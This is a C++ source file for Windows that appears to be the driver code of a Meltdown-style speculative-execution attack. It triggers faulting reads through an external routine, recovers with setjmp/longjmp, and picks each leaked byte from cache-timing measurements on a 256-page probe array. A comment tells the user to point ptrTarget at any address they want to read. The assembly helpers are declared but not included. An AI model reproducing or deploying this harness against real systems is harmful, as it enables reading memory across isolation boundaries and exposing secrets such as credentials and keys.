#include "stdafx.h"
#include <setjmp.h>
#include <windows.h>
#include <iostream>

#define TARGETS_N 5

extern "C" {
	LPVOID probeArray;
	LPVOID timings;
	DWORD  _leak(LPVOID ptr, DWORD dwSize, LPVOID lpDummy);
	DWORD _my_leak(LPVOID addr);
	void _read_time();
	DWORD raise_exp_f;
	LPVOID secret;
}

BYTE leak(LPVOID ptrAddr);
jmp_buf jump_buffer;

void raise_exp(DWORD n)
{
	for (int i = 0; i < 10; i++)
		;

	longjmp(jump_buffer, 1);

	return;
}


int main(int argc, char* argv[])
{
	LPVOID ptrTarget;
	CONST DWORD n = 4 * 0x0a;
	BYTE lpBuffer[n] = { 0 };

	probeArray = malloc(0x1000 * 0x100);

	secret = (LPVOID)malloc(0x1000 * 500);
	strcpy_s((char*)secret + 0x1000 * 250,20, "this is the secret");

	//change the ptrTarget to addr where you want to read.
	ptrTarget = (LPVOID)((char*)secret + 0x1000 * 250);


	timings = malloc(0x100 * sizeof(DWORD));
	raise_exp_f = (DWORD)raise_exp;

	std::cout << "leaking " << std::hex << ptrTarget << std::endl;
	for (DWORD i = 0; i < n; i++) {
		DWORD dwCounter = 0;
		do {
			lpBuffer[i] = (BYTE)leak(((LPBYTE)ptrTarget) + i);
		} while ((DWORD)lpBuffer[i] == 0 && dwCounter++ < 0x1000);
		std::cout << std::hex << (DWORD)lpBuffer[i] << " " << (char)lpBuffer[i] << std::endl;
	}

	free(secret);
	free(probeArray);
	free(timings);

	return 0;
}

BYTE leak(LPVOID ptrAddr) {
	DWORD leakedByte = 0;
	BYTE result = 0;

	BOOL match = FALSE;
	do {
		if (0 == setjmp(jump_buffer))
		{
			leakedByte = _my_leak(ptrAddr);
		}

		_read_time();
		for (DWORD i = 0; i < 0x100; i++) {
			if (((DWORD*)timings)[i] < 150) {
				match = TRUE;
				result = i;
				break;
			}
		}
	} while (!match);

	return (BYTE)result;
}
